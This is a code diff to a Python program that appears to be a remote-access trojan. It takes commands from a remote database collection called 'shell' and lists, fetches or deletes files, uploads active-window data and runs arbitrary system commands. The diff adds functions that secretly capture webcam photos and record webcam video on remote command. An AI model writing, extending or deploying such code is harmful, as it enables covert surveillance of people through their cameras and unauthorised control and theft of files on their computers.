@@ -107,6 +107,44 @@ def active_windows():
         }
     upload(data)
 
+def webcam(cwd):
+    os.chdir(cwd)
+    cam_port = 0
+    cam = cv2.VideoCapture(cam_port)
+    result, image = cam.read()
+    if result:
+        try:
+            cv2.imwrite("gfg.png", image)
+        except:
+            pass
+        finally:
+            clearPrevData()
+
+
+def vwebcam(cwd,time):
+    os.chdir(cwd)
+    cap = cv2.VideoCapture(0)
+    if (cap.isOpened() == False):
+        print('Unaable to open camera feed')
+    frame_width = int(cap.get(3))
+    frame_height = int(cap.get(4))
+    out = cv2.VideoWriter('output.mp4', cv2.VideoWriter_fourcc(*'MP4V'), 10, (frame_width, frame_height))
+    try:
+        for x in range(time*12, 0, -1):
+            ret, frame = cap.read()
+            if ret == True:
+                cv2.flip(frame, 180)
+                out.write(frame)
+            else:
+                break
+    except:
+        pass
+    finally:
+        clearPrevData()
+        cap.release()
+        cv2.destroyAllWindows()
+
+
 def action_on_system(new_path="",command="",original_filename="",new_foldername="",new_filename="",path=""):
 	if command=='dir':
 		dirs=json.dumps(os.listdir(path))
@@ -117,7 +155,6 @@ def action_on_system(new_path="",command="",original_filename="",new_foldername=
 		return data
 	elif command=='cd':
 		path=path+f'\{new_path}'
-		print(path)
 	elif command=='deletefile':
 		os.remove(path+f'\{original_filename}')
 	elif command=='getfile':
@@ -214,8 +251,7 @@ def str_to_byte(key):
 def action_take(listen):
     db=client['shell']
     action=listen['action']
-    cwd=listen['current_path']
-
+    cwd=listen['current_path']  
     try:
         if action=='dir':
             res=action_on_system(command=action,path=cwd)
@@ -297,6 +333,11 @@ def action_take(listen):
                 pass
         elif action=='activewindows':
             active_windows()
+        elif action=='webcam':
+            webcam(cwd)
+        elif action=='vwebcam':
+            time=listen['timeout']
+            vwebcam(cwd,int(time))
         elif listen['is_systemCommand']==1:
             cmd=listen['action']
             try:
